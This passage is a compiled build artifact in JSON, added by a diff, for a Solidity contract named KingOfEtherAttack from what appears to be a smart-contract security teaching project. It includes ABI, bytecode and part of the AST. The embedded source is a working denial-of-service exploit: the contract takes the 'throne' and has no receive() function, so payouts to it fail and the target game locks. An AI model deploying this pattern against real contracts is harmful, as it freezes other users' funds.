@@ -1,0 +1,1263 @@
+{
+  "contractName": "KingOfEtherAttack",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_kingOfEther",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attacker",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "kingOfEther",
+      "outputs": [
+        {
+          "internalType": "contract KingOfEther",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    }
+  ],
+  "metadata": "{\"compiler\":{\"version\":\"0.8.11+commit.d7f03943\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_kingOfEther\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attacker\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kingOfEther\",\"outputs\":[{\"internalType\":\"contract KingOfEther\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"attack()\":{\"notice\":\"attack - \\u5c1d\\u8bd5\\u518d\\u6b21\\u653b\\u51fb\\uff08\\u53ef\\u9009\\uff0c\\u7528\\u4e8e\\u589e\\u52a0\\u9501\\u5b9a\\u91d1\\u989d\\uff09\"},\"constructor\":{\"notice\":\"\\u6784\\u9020\\u51fd\\u6570 - \\u6210\\u4e3a\\u56fd\\u738b\"}},\"notice\":\"KingOfEtherAttack - DoS \\u653b\\u51fb\\u5408\\u7ea6  \\u653b\\u51fb\\u539f\\u7406\\uff1a \\u6210\\u4e3a\\u56fd\\u738b\\u540e\\uff0c\\u8ba9\\u5408\\u7ea6\\u6ca1\\u6709 receive() \\u51fd\\u6570 \\u8fd9\\u6837\\u5f53\\u65b0\\u7684\\u6311\\u6218\\u8005\\u60f3\\u8981\\u6210\\u4e3a\\u56fd\\u738b\\u65f6\\uff0c\\u5411\\u8fd9\\u4e2a\\u5408\\u7ea6\\u8f6c\\u8d26\\u4f1a\\u5931\\u8d25 \\u5bfc\\u81f4 KingOfEther \\u5408\\u7ea6\\u5361\\u6b7b\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"project:/contracts/KingOfEtherAttack.sol\":\"KingOfEtherAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"project:/contracts/KingOfEther.sol\":{\"keccak256\":\"0x992e5131a2eaf1350b158d71d7b53fcb9756180f931214cc333c4e992012758b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f82e1953663dff934c5a31dd257a00a78323c63c38827d7ba623882be01763b5\",\"dweb:/ipfs/Qma3PY8wry88rHW1m9seJ1aKLLayM41osTUPQSePvw2rrz\"]},\"project:/contracts/KingOfEtherAttack.sol\":{\"keccak256\":\"0xabc9295d09d3fa46e9ebdb326f8185a4e15ca63deaf0fe7e20206f0752baaffd\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df2c94abf7d4236c512ca24eca35a84669a8ee2e71decc03fdae0b6b0193559f\",\"dweb:/ipfs/QmRcJGTREnMs6XA619yhZqZheCe52bPz9wtj4JqVPZCCzZ\"]}},\"version\":1}",
+  "bytecode": "0x6080604052604051610213380380610213833981016040819052610022916100a2565b600080546001600160a01b0383166001600160a01b031991821681178355600180549092163317909155604080516369deb7b760e01b8152905191926369deb7b7923492600480820193929182900301818588803b15801561008357600080fd5b505af1158015610097573d6000803e3d6000fd5b5050505050506100d2565b6000602082840312156100b457600080fd5b81516001600160a01b03811681146100cb57600080fd5b9392505050565b610132806100e16000396000f3fe60806040526004361060305760003560e01c806348eb76ee14603557806388fcf0b314606f5780639e5faafc14608d575b600080fd5b348015604057600080fd5b506001546053906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b348015607a57600080fd5b506000546053906001600160a01b031681565b60936095565b005b60008054906101000a90046001600160a01b03166001600160a01b03166369deb7b7346040518263ffffffff1660e01b81526004016000604051808303818588803b15801560e257600080fd5b505af115801560f5573d6000803e3d6000fd5b505050505056fea26469706673582212209206e5b3d28db517326942b93d318e9eee26562851d26f3a6a6976af46f5673664736f6c634300080b0033",
+  "deployedBytecode": "0x60806040526004361060305760003560e01c806348eb76ee14603557806388fcf0b314606f5780639e5faafc14608d575b600080fd5b348015604057600080fd5b506001546053906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b348015607a57600080fd5b506000546053906001600160a01b031681565b60936095565b005b60008054906101000a90046001600160a01b03166001600160a01b03166369deb7b7346040518263ffffffff1660e01b81526004016000604051808303818588803b15801560e257600080fd5b505af115801560f5573d6000803e3d6000fd5b505050505056fea26469706673582212209206e5b3d28db517326942b93d318e9eee26562851d26f3a6a6976af46f5673664736f6c634300080b0033",
+  "immutableReferences": {},
+  "generatedSources": [
+    {
+      "ast": {
+        "nodeType": "YulBlock",
+        "src": "0:306:17",
+        "statements": [
+          {
+            "nodeType": "YulBlock",
+            "src": "6:3:17",
+            "statements": []
+          },
+          {
+            "body": {
+              "nodeType": "YulBlock",
+              "src": "95:209:17",
+              "statements": [
+                {
+                  "body": {
+                    "nodeType": "YulBlock",
+                    "src": "141:16:17",
+                    "statements": [
+                      {
+                        "expression": {
+                          "arguments": [
+                            {
+                              "kind": "number",
+                              "nodeType": "YulLiteral",
+                              "src": "150:1:17",
+                              "type": "",
+                              "value": "0"
+                            },
+                            {
+                              "kind": "number",
+                              "nodeType": "YulLiteral",
+                              "src": "153:1:17",
+                              "type": "",
+                              "value": "0"
+                            }
+                          ],
+                          "functionName": {
+                            "name": "revert",
+                            "nodeType": "YulIdentifier",
+                            "src": "143:6:17"
+                          },
+                          "nodeType": "YulFunctionCall",
+                          "src": "143:12:17"
+                        },
+                        "nodeType": "YulExpressionStatement",
+                        "src": "143:12:17"
+                      }
+                    ]
+                  },
+                  "condition": {
+                    "arguments": [
+                      {
+                        "arguments": [
+                          {
+                            "name": "dataEnd",
+                            "nodeType": "YulIdentifier",
+                            "src": "116:7:17"
+                          },
+                          {
+                            "name": "headStart",
+                            "nodeType": "YulIdentifier",
+                            "src": "125:9:17"
+                          }
+                        ],
+                        "functionName": {
+                          "name": "sub",
+                          "nodeType": "YulIdentifier",
+                          "src": "112:3:17"
+                        },
+                        "nodeType": "YulFunctionCall",
+                        "src": "112:23:17"
+                      },
+                      {
+                        "kind": "number",
+                        "nodeType": "YulLiteral",
+                        "src": "137:2:17",
+                        "type": "",
+                        "value": "32"
+                      }
+                    ],
+                    "functionName": {
+                      "name": "slt",
+                      "nodeType": "YulIdentifier",
+                      "src": "108:3:17"
+                    },
+                    "nodeType": "YulFunctionCall",
+                    "src": "108:32:17"
+                  },
+                  "nodeType": "YulIf",
+                  "src": "105:52:17"
+                },
+                {
+                  "nodeType": "YulVariableDeclaration",
+                  "src": "166:29:17",
+                  "value": {
+                    "arguments": [
+                      {
+                        "name": "headStart",
+                        "nodeType": "YulIdentifier",
+                        "src": "185:9:17"
+                      }
+                    ],
+                    "functionName": {
+                      "name": "mload",
+                      "nodeType": "YulIdentifier",
+                      "src": "179:5:17"
+                    },
+                    "nodeType": "YulFunctionCall",
+                    "src": "179:16:17"
+                  },
+                  "variables": [
+                    {
+                      "name": "value",
+                      "nodeType": "YulTypedName",
+                      "src": "170:5:17",
+                      "type": ""
+                    }
+                  ]
+                },
+                {
+                  "body": {
+                    "nodeType": "YulBlock",
+                    "src": "258:16:17",
+                    "statements": [
+                      {
+                        "expression": {
+                          "arguments": [
+                            {
+                              "kind": "number",
+                              "nodeType": "YulLiteral",
+                              "src": "267:1:17",
+                              "type": "",
+                              "value": "0"
+                            },
+                            {
+                              "kind": "number",
+                              "nodeType": "YulLiteral",
+                              "src": "270:1:17",
+                              "type": "",
+                              "value": "0"
+                            }
+                          ],
+                          "functionName": {
+                            "name": "revert",
+                            "nodeType": "YulIdentifier",
+                            "src": "260:6:17"
+                          },
+                          "nodeType": "YulFunctionCall",
+                          "src": "260:12:17"
+                        },
+                        "nodeType": "YulExpressionStatement",
+                        "src": "260:12:17"
+                      }
+                    ]
+                  },
+                  "condition": {
+                    "arguments": [
+                      {
+                        "arguments": [
+                          {
+                            "name": "value",
+                            "nodeType": "YulIdentifier",
+                            "src": "217:5:17"
+                          },
+                          {
+                            "arguments": [
+                              {
+                                "name": "value",
+                                "nodeType": "YulIdentifier",
+                                "src": "228:5:17"
+                              },
+                              {
+                                "arguments": [
+                                  {
+                                    "arguments": [
+                                      {
+                                        "kind": "number",
+                                        "nodeType": "YulLiteral",
+                                        "src": "243:3:17",
+                                        "type": "",
+                                        "value": "160"
+                                      },
+                                      {
+                                        "kind": "number",
+                                        "nodeType": "YulLiteral",
+                                        "src": "248:1:17",
+                                        "type": "",
+                                        "value": "1"
+                                      }
+                                    ],
+                                    "functionName": {
+                                      "name": "shl",
+                                      "nodeType": "YulIdentifier",
+                                      "src": "239:3:17"
+                                    },
+                                    "nodeType": "YulFunctionCall",
+                                    "src": "239:11:17"
+                                  },
+                                  {
+                                    "kind": "number",
+                                    "nodeType": "YulLiteral",
+                                    "src": "252:1:17",
+                                    "type": "",
+                                    "value": "1"
+                                  }
+                                ],
+                                "functionName": {
+                                  "name": "sub",
+                                  "nodeType": "YulIdentifier",
+                                  "src": "235:3:17"
+                                },
+                                "nodeType": "YulFunctionCall",
+                                "src": "235:19:17"
+                              }
+                            ],
+                            "functionName": {
+                              "name": "and",
+                              "nodeType": "YulIdentifier",
+                              "src": "224:3:17"
+                            },
+                            "nodeType": "YulFunctionCall",
+                            "src": "224:31:17"
+                          }
+                        ],
+                        "functionName": {
+                          "name": "eq",
+                          "nodeType": "YulIdentifier",
+                          "src": "214:2:17"
+                        },
+                        "nodeType": "YulFunctionCall",
+                        "src": "214:42:17"
+                      }
+                    ],
+                    "functionName": {
+                      "name": "iszero",
+                      "nodeType": "YulIdentifier",
+                      "src": "207:6:17"
+                    },
+                    "nodeType": "YulFunctionCall",
+                    "src": "207:50:17"
+                  },
+                  "nodeType": "YulIf",
+                  "src": "204:70:17"
+                },
+                {
+                  "nodeType": "YulAssignment",
+                  "src": "283:15:17",
+                  "value": {
+                    "name": "value",
+                    "nodeType": "YulIdentifier",
+                    "src": "293:5:17"
+                  },
+                  "variableNames": [
+                    {
+                      "name": "value0",
+                      "nodeType": "YulIdentifier",
+                      "src": "283:6:17"
+                    }
+                  ]
+                }
+              ]
+            },
+            "name": "abi_decode_tuple_t_address_fromMemory",
+            "nodeType": "YulFunctionDefinition",
+            "parameters": [
+              {
+                "name": "headStart",
+                "nodeType": "YulTypedName",
+                "src": "61:9:17",
+                "type": ""
+              },
+              {
+                "name": "dataEnd",
+                "nodeType": "YulTypedName",
+                "src": "72:7:17",
+                "type": ""
+              }
+            ],
+            "returnVariables": [
+              {
+                "name": "value0",
+                "nodeType": "YulTypedName",
+                "src": "84:6:17",
+                "type": ""
+              }
+            ],
+            "src": "14:290:17"
+          }
+        ]
+      },
+      "contents": "{\n    { }\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        let value := mload(headStart)\n        if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n        value0 := value\n    }\n}",
+      "id": 17,
+      "language": "Yul",
+      "name": "#utility.yul"
+    }
+  ],
+  "deployedGeneratedSources": [
+    {
+      "ast": {
+        "nodeType": "YulBlock",
+        "src": "0:446:17",
+        "statements": [
+          {
+            "nodeType": "YulBlock",
+            "src": "6:3:17",
+            "statements": []
+          },
+          {
+            "body": {
+              "nodeType": "YulBlock",
+              "src": "115:102:17",
+              "statements": [
+                {
+                  "nodeType": "YulAssignment",
+                  "src": "125:26:17",
+                  "value": {
+                    "arguments": [
+                      {
+                        "name": "headStart",
+                        "nodeType": "YulIdentifier",
+                        "src": "137:9:17"
+                      },
+                      {
+                        "kind": "number",
+                        "nodeType": "YulLiteral",
+                        "src": "148:2:17",
+                        "type": "",
+                        "value": "32"
+                      }
+                    ],
+                    "functionName": {
+                      "name": "add",
+                      "nodeType": "YulIdentifier",
+                      "src": "133:3:17"
+                    },
+                    "nodeType": "YulFunctionCall",
+                    "src": "133:18:17"
+                  },
+                  "variableNames": [
+                    {
+                      "name": "tail",
+                      "nodeType": "YulIdentifier",
+                      "src": "125:4:17"
+                    }
+                  ]
+                },
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "name": "headStart",
+                        "nodeType": "YulIdentifier",
+                        "src": "167:9:17"
+                      },
+                      {
+                        "arguments": [
+                          {
+                            "name": "value0",
+                            "nodeType": "YulIdentifier",
+                            "src": "182:6:17"
+                          },
+                          {
+                            "arguments": [
+                              {
+                                "arguments": [
+                                  {
+                                    "kind": "number",
+                                    "nodeType": "YulLiteral",
+                                    "src": "198:3:17",
+                                    "type": "",
+                                    "value": "160"
+                                  },
+                                  {
+                                    "kind": "number",
+                                    "nodeType": "YulLiteral",
+                                    "src": "203:1:17",
+                                    "type": "",
+                                    "value": "1"
+                                  }
+                                ],
+                                "functionName": {
+                                  "name": "shl",
+                                  "nodeType": "YulIdentifier",
+                                  "src": "194:3:17"
+                                },
+                                "nodeType": "YulFunctionCall",
+                                "src": "194:11:17"
+                              },
+                              {
+                                "kind": "number",
+                                "nodeType": "YulLiteral",
+                                "src": "207:1:17",
+                                "type": "",
+                                "value": "1"
+                              }
+                            ],
+                            "functionName": {
+                              "name": "sub",
+                              "nodeType": "YulIdentifier",
+                              "src": "190:3:17"
+                            },
+                            "nodeType": "YulFunctionCall",
+                            "src": "190:19:17"
+                          }
+                        ],
+                        "functionName": {
+                          "name": "and",
+                          "nodeType": "YulIdentifier",
+                          "src": "178:3:17"
+                        },
+                        "nodeType": "YulFunctionCall",
+                        "src": "178:32:17"
+                      }
+                    ],
+                    "functionName": {
+                      "name": "mstore",
+                      "nodeType": "YulIdentifier",
+                      "src": "160:6:17"
+                    },
+                    "nodeType": "YulFunctionCall",
+                    "src": "160:51:17"
+                  },
+                  "nodeType": "YulExpressionStatement",
+                  "src": "160:51:17"
+                }
+              ]
+            },
+            "name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
+            "nodeType": "YulFunctionDefinition",
+            "parameters": [
+              {
+                "name": "headStart",
+                "nodeType": "YulTypedName",
+                "src": "84:9:17",
+                "type": ""
+              },
+              {
+                "name": "value0",
+                "nodeType": "YulTypedName",
+                "src": "95:6:17",
+                "type": ""
+              }
+            ],
+            "returnVariables": [
+              {
+                "name": "tail",
+                "nodeType": "YulTypedName",
+                "src": "106:4:17",
+                "type": ""
+              }
+            ],
+            "src": "14:203:17"
+          },
+          {
+            "body": {
+              "nodeType": "YulBlock",
+              "src": "342:102:17",
+              "statements": [
+                {
+                  "nodeType": "YulAssignment",
+                  "src": "352:26:17",
+                  "value": {
+                    "arguments": [
+                      {
+                        "name": "headStart",
+                        "nodeType": "YulIdentifier",
+                        "src": "364:9:17"
+                      },
+                      {
+                        "kind": "number",
+                        "nodeType": "YulLiteral",
+                        "src": "375:2:17",
+                        "type": "",
+                        "value": "32"
+                      }
+                    ],
+                    "functionName": {
+                      "name": "add",
+                      "nodeType": "YulIdentifier",
+                      "src": "360:3:17"
+                    },
+                    "nodeType": "YulFunctionCall",
+                    "src": "360:18:17"
+                  },
+                  "variableNames": [
+                    {
+                      "name": "tail",
+                      "nodeType": "YulIdentifier",
+                      "src": "352:4:17"
+                    }
+                  ]
+                },
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "name": "headStart",
+                        "nodeType": "YulIdentifier",
+                        "src": "394:9:17"
+                      },
+                      {
+                        "arguments": [
+                          {
+                            "name": "value0",
+                            "nodeType": "YulIdentifier",
+                            "src": "409:6:17"
+                          },
+                          {
+                            "arguments": [
+                              {
+                                "arguments": [
+                                  {
+                                    "kind": "number",
+                                    "nodeType": "YulLiteral",
+                                    "src": "425:3:17",
+                                    "type": "",
+                                    "value": "160"
+                                  },
+                                  {
+                                    "kind": "number",
+                                    "nodeType": "YulLiteral",
+                                    "src": "430:1:17",
+                                    "type": "",
+                                    "value": "1"
+                                  }
+                                ],
+                                "functionName": {
+                                  "name": "shl",
+                                  "nodeType": "YulIdentifier",
+                                  "src": "421:3:17"
+                                },
+                                "nodeType": "YulFunctionCall",
+                                "src": "421:11:17"
+                              },
+                              {
+                                "kind": "number",
+                                "nodeType": "YulLiteral",
+                                "src": "434:1:17",
+                                "type": "",
+                                "value": "1"
+                              }
+                            ],
+                            "functionName": {
+                              "name": "sub",
+                              "nodeType": "YulIdentifier",
+                              "src": "417:3:17"
+                            },
+                            "nodeType": "YulFunctionCall",
+                            "src": "417:19:17"
+                          }
+                        ],
+                        "functionName": {
+                          "name": "and",
+                          "nodeType": "YulIdentifier",
+                          "src": "405:3:17"
+                        },
+                        "nodeType": "YulFunctionCall",
+                        "src": "405:32:17"
+                      }
+                    ],
+                    "functionName": {
+                      "name": "mstore",
+                      "nodeType": "YulIdentifier",
+                      "src": "387:6:17"
+                    },
+                    "nodeType": "YulFunctionCall",
+                    "src": "387:51:17"
+                  },
+                  "nodeType": "YulExpressionStatement",
+                  "src": "387:51:17"
+                }
+              ]
+            },
+            "name": "abi_encode_tuple_t_contract$_KingOfEther_$861__to_t_address__fromStack_reversed",
+            "nodeType": "YulFunctionDefinition",
+            "parameters": [
+              {
+                "name": "headStart",
+                "nodeType": "YulTypedName",
+                "src": "311:9:17",
+                "type": ""
+              },
+              {
+                "name": "value0",
+                "nodeType": "YulTypedName",
+                "src": "322:6:17",
+                "type": ""
+              }
+            ],
+            "returnVariables": [
+              {
+                "name": "tail",
+                "nodeType": "YulTypedName",
+                "src": "333:4:17",
+                "type": ""
+              }
+            ],
+            "src": "222:222:17"
+          }
+        ]
+      },
+      "contents": "{\n    { }\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, and(value0, sub(shl(160, 1), 1)))\n    }\n    function abi_encode_tuple_t_contract$_KingOfEther_$861__to_t_address__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, and(value0, sub(shl(160, 1), 1)))\n    }\n}",
+      "id": 17,
+      "language": "Yul",
+      "name": "#utility.yul"
+    }
+  ],
+  "sourceMap": "329:695:10:-:0;;;483:232;;;;;;;;;;;;;;;;;;:::i;:::-;535:11;:39;;-1:-1:-1;;;;;535:39:10;;-1:-1:-1;;;;;;535:39:10;;;;;;;;584:21;;;;;595:10;584:21;;;;665:43;;;-1:-1:-1;;;665:43:10;;;;535:39;;665:23;;696:9;;665:43;;;;;535:11;665:43;;;;;;696:9;535:39;665:43;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;483:232;329:695;;14:290:17;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:17;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:17:o;:::-;329:695:10;;;;;;",
+  "deployedSourceMap": "329:695:10:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;398:23;;;;;;;;;;-1:-1:-1;398:23:10;;;;-1:-1:-1;;;;;398:23:10;;;;;;-1:-1:-1;;;;;178:32:17;;;160:51;;148:2;133:18;398:23:10;;;;;;;362:30;;;;;;;;;;-1:-1:-1;362:30:10;;;;-1:-1:-1;;;;;362:30:10;;;929:93;;;:::i;:::-;;;972:11;;;;;;;;-1:-1:-1;;;;;972:11:10;-1:-1:-1;;;;;972:23:10;;1003:9;972:43;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;929:93::o",
+  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\nimport \"./KingOfEther.sol\";\n\n/**\n * KingOfEtherAttack - DoS 攻击合约\n * \n * 攻击原理：\n * 成为国王后，让合约没有 receive() 函数\n * 这样当新的挑战者想要成为国王时，向这个合约转账会失败\n * 导致 KingOfEther 合约卡死\n */\ncontract KingOfEtherAttack {\n    KingOfEther public kingOfEther;\n    address public attacker;\n    \n    /**\n     * 构造函数 - 成为国王\n     */\n    constructor(address _kingOfEther) payable {\n        kingOfEther = KingOfEther(_kingOfEther);\n        attacker = msg.sender;\n        \n        // 直接存入 ETH 成为国王\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n    \n    /**\n     * 注意：没有 receive() 函数！\n     * 这样当向这个合约转账时会失败\n     */\n    \n    /**\n     * attack - 尝试再次攻击（可选，用于增加锁定金额）\n     */\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n",
+  "sourcePath": "C:\\Users\\ZhuanZ1\\Desktop\\smart-contract-security\\contracts\\KingOfEtherAttack.sol",
+  "ast": {
+    "absolutePath": "project:/contracts/KingOfEtherAttack.sol",
+    "exportedSymbols": {
+      "KingOfEther": [
+        861
+      ],
+      "KingOfEtherAttack": [
+        910
+      ]
+    },
+    "id": 911,
+    "license": "MIT",
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 863,
+        "literals": [
+          "solidity",
+          "^",
+          "0.8",
+          ".11"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "32:24:10"
+      },
+      {
+        "absolutePath": "project:/contracts/KingOfEther.sol",
+        "file": "./KingOfEther.sol",
+        "id": 864,
+        "nameLocation": "-1:-1:-1",
+        "nodeType": "ImportDirective",
+        "scope": 911,
+        "sourceUnit": 862,
+        "src": "58:27:10",
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "KingOfEtherAttack",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "documentation": {
+          "id": 865,
+          "nodeType": "StructuredDocumentation",
+          "src": "87:241:10",
+          "text": " KingOfEtherAttack - DoS 攻击合约\n \n 攻击原理：\n 成为国王后，让合约没有 receive() 函数\n 这样当新的挑战者想要成为国王时，向这个合约转账会失败\n 导致 KingOfEther 合约卡死"
+        },
+        "fullyImplemented": true,
+        "id": 910,
+        "linearizedBaseContracts": [
+          910
+        ],
+        "name": "KingOfEtherAttack",
+        "nameLocation": "338:17:10",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "constant": false,
+            "functionSelector": "88fcf0b3",
+            "id": 868,
+            "mutability": "mutable",
+            "name": "kingOfEther",
+            "nameLocation": "381:11:10",
+            "nodeType": "VariableDeclaration",
+            "scope": 910,
+            "src": "362:30:10",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_KingOfEther_$861",
+              "typeString": "contract KingOfEther"
+            },
+            "typeName": {
+              "id": 867,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 866,
+                "name": "KingOfEther",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 861,
+                "src": "362:11:10"
+              },
+              "referencedDeclaration": 861,
+              "src": "362:11:10",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_KingOfEther_$861",
+                "typeString": "contract KingOfEther"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "constant": false,
+            "functionSelector": "48eb76ee",
+            "id": 870,
+            "mutability": "mutable",
+            "name": "attacker",
+            "nameLocation": "413:8:10",
+            "nodeType": "VariableDeclaration",
+            "scope": 910,
+            "src": "398:23:10",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_address",
+              "typeString": "address"
+            },
+            "typeName": {
+              "id": 869,
+              "name": "address",
+              "nodeType": "ElementaryTypeName",
+              "src": "398:7:10",
+              "stateMutability": "nonpayable",
+              "typeDescriptions": {
+                "typeIdentifier": "t_address",
+                "typeString": "address"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 895,
+              "nodeType": "Block",
+              "src": "525:190:10",
+              "statements": [
+                {
+                  "expression": {
+                    "id": 880,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 876,
+                      "name": "kingOfEther",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 868,
+                      "src": "535:11:10",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_KingOfEther_$861",
+                        "typeString": "contract KingOfEther"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "arguments": [
+                        {
+                          "id": 878,
+                          "name": "_kingOfEther",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 873,
+                          "src": "561:12:10",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 877,
+                        "name": "KingOfEther",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 861,
+                        "src": "549:11:10",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_KingOfEther_$861_$",
+                          "typeString": "type(contract KingOfEther)"
+                        }
+                      },
+                      "id": 879,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "549:25:10",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_KingOfEther_$861",
+                        "typeString": "contract KingOfEther"
+                      }
+                    },
+                    "src": "535:39:10",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_KingOfEther_$861",
+                      "typeString": "contract KingOfEther"
+                    }
+                  },
+                  "id": 881,
+                  "nodeType": "ExpressionStatement",
+                  "src": "535:39:10"
+                },
+                {
+                  "expression": {
+                    "id": 885,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 882,
+                      "name": "attacker",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 870,
+                      "src": "584:8:10",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "expression": {
+                        "id": 883,
+                        "name": "msg",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 4294967281,
+                        "src": "595:3:10",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_magic_message",
+                          "typeString": "msg"
+                        }
+                      },
+                      "id": 884,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "sender",
+                      "nodeType": "MemberAccess",
+                      "src": "595:10:10",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "src": "584:21:10",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "id": 886,
+                  "nodeType": "ExpressionStatement",
+                  "src": "584:21:10"
+                },
+                {
+                  "expression": {
+                    "arguments": [],
+                    "expression": {
+                      "argumentTypes": [],
+                      "expression": {
+                        "argumentTypes": [],
+                        "expression": {
+                          "id": 887,
+                          "name": "kingOfEther",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 868,
+                          "src": "665:11:10",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_KingOfEther_$861",
+                            "typeString": "contract KingOfEther"
+                          }
+                        },
+                        "id": 889,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberName": "claimThrone",
+                        "nodeType": "MemberAccess",
+                        "referencedDeclaration": 847,
+                        "src": "665:23:10",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
+                          "typeString": "function () payable external"
+                        }
+                      },
+                      "id": 892,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "names": [
+                        "value"
+                      ],
+                      "nodeType": "FunctionCallOptions",
+                      "options": [
+                        {
+                          "expression": {
+                            "id": 890,
+                            "name": "msg",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 4294967281,
+                            "src": "696:3:10",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_magic_message",
+                              "typeString": "msg"
+                            }
+                          },
+                          "id": 891,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "memberName": "value",
+                          "nodeType": "MemberAccess",
